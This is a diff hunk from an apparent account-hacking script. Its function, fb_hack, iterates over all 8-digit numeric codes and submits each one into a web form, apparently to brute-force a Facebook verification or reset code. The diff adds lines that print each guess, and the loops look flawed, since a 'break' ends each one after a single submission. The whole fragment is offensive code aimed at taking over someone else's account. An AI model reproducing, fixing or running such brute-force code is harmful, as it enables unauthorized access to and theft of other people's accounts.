@@ -141,12 +141,14 @@ def fb_hack(email, codex):
     attempt = int(codex)
     for combination in itertools.product(range(10), repeat=8):
       y = (''.join(map(str, combination)))
+      print(y)
       browser.select_form(nr=0)
       browser.set_value(str(y), nr=5)
       browser.submit()
       break
     for combination in itertools.product(range(10), repeat=8):
       y = (''.join(map(str, combination)))
+      print(y)
       browser.select_form(nr=0)
       browser.set_value(str(y), nr=5)
       browser.submit()
